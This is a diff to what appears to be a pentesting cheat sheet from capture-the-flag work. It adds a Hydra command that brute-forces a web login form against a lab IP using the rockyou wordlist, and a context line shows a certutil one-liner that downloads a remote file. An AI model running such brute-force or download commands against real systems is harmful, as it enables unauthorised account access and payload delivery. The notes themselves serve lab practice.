@@ -60,6 +60,14 @@ cmd.exe /C net use /D /Y * && cmd.exe /C certutil.exe -urlcache -split -f 'http:
 
 ## Tools
 
+### Hydra
+
+#### Brute force login form
+
+```
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -Vv -f
+ ```
+
 ### John
 
 #### 7z
